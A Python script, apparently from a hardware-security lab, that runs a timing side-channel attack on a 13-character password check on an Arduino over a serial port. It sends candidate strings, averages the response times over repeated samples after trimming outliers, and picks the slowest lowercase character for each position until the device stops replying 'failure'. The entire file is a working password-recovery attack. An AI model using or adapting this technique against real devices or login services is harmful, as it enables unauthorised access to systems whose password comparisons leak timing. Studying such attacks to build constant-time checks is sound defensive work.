import serial
import time
import string

arduino_port = 'COM6'
baud_rate = 115200
timeout_duration = 0.1
iterations = 50
password_length = 13
samples_per_iteration = 10


def measure_response_time(data, arduino: serial.Serial,position):
    try:
        arduino.reset_input_buffer()
        arduino.reset_output_buffer()
        message = (bytes(data + '\n', 'utf-8'))
        start_time = time.time()
        arduino.write(message)
        while arduino.in_waiting == 0:
            continue
        end_time = time.time()
        elapsed_time = end_time - start_time
        response = arduino.readline().decode('utf-8').strip()
        arduino.readline()
        print(f"Sent: {data}, Received: {response}, Time: {elapsed_time:.6f} seconds")
        if position == password_length and response.find("failure") == -1:
            return elapsed_time, response
        return elapsed_time, None
    except Exception as exception:
        print(f"Error: {exception}")
        return None, None


# Remove outliers (top 5% and bottom 5%)
def remove_outliers(data_list):
    if len(data_list) < 3:
        return data_list
    sorted_data = sorted(data_list)
    n = len(sorted_data)
    trimmed_data = sorted_data[int(n * 0.05):int(n * 0.95)]  # Remove 5% from each end
    return trimmed_data


# Function to get the worst character for each position in the password
def get_password(test_password, reader: serial.Serial):
    most_probable_password = list(test_password)
    for position in range(password_length):
        most_probable_char = 'a'
        slowest_avg_time = float('-inf')

        for char in string.ascii_lowercase:
            test_password = most_probable_password.copy()
            test_password[position] = char
            test_string = ''.join(test_password)
            times = []
            for _ in range(samples_per_iteration):
                elapsed_time, response = measure_response_time(test_string, reader, position+1)
                if response is not None:
                    print(f"Password found: {test_string}");
                    return test_string
                if elapsed_time:
                    times.append(elapsed_time)
            filtered_times = remove_outliers(times)
            avg_time = sum(filtered_times) / len(filtered_times) if filtered_times else float('inf')

            print(f"Tested '{char}' at position {position + 1}, Avg Time: {avg_time:.6f} seconds")

            if avg_time > slowest_avg_time:
                slowest_avg_time = avg_time
                most_probable_char = char

        most_probable_password[position] = most_probable_char
        print(
            f"Best character for position {position + 1} is '{most_probable_char}' with Avg Time: {slowest_avg_time:.6f}"
            f"seconds")

    return ''.join(most_probable_password)


try:
    with serial.Serial(arduino_port, baud_rate, timeout=timeout_duration) as ser:
        time.sleep(2)
        ready_response = ser.read(1)
        print(f"Arduino Ready: {ready_response}")
        time.sleep(2)
        base_password = 'a' * password_length
        arduino_password = get_password(base_password, ser)
        print(f"\nArduino Password: {arduino_password}")

except serial.SerialException as e:
    print(f"Serial connection error: {e}")
except Exception as e:
    print(f"Error: {e}")
